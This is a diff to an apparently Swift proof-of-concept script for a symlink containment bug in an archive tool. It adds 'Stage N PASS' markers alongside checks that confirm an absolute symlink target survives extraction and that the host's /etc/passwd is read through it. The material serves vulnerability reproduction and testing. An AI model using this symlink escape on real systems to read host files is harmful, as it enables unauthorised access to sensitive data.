@@ -97,6 +97,7 @@ print()
 if passesCheck {
     print("✓ BUG CONFIRMED: absolute target passes containment check via appending() concatenation")
     print("  The archive writer will include entry.symlinkTarget = \"\(rawTarget)\"")
+    print("Stage 1 PASS")
 } else {
     print("✗ NOT REPRODUCED: containment check correctly rejects the symlink")
     print("  (swift-system may have changed appending() semantics — re-check library version)")
@@ -146,6 +147,7 @@ for (entry, _) in reader.makeStreamingIterator() {
     if let t = entry.symlinkTarget, t == poisonTarget {
         foundMaliciousSymlink = true
         print("  ^^^ MALICIOUS: absolute host path \"\(t)\" survived containment check!")
+        print("Stage 2 PASS")
     }
 }
 print()
@@ -175,6 +177,7 @@ if lstat(extractedEvil.path, &evilStat) == 0, (evilStat.st_mode & S_IFMT) == S_I
     let extractedTarget = n > 0 ? String(cString: buf) : "(readlink failed)"
     print("On host: \(extractedEvil.path) -> \(extractedTarget)")
     if extractedTarget == poisonTarget {
+        print("Stage 3 PASS")
         print()
         print("╔══════════════════════════════════════════════════════════════╗")
         print("║  EXPLOIT CONFIRMED                                           ║")
@@ -204,6 +207,7 @@ if lstat(extractedEvil.path, &evilStat) == 0, (evilStat.st_mode & S_IFMT) == S_I
                 print("  [4] HOST /etc/passwd first line (read through symlink):")
                 print("      \(firstLine)")
                 hostDataRead = true
+                print("Stage 4 PASS")
             }
         }
 
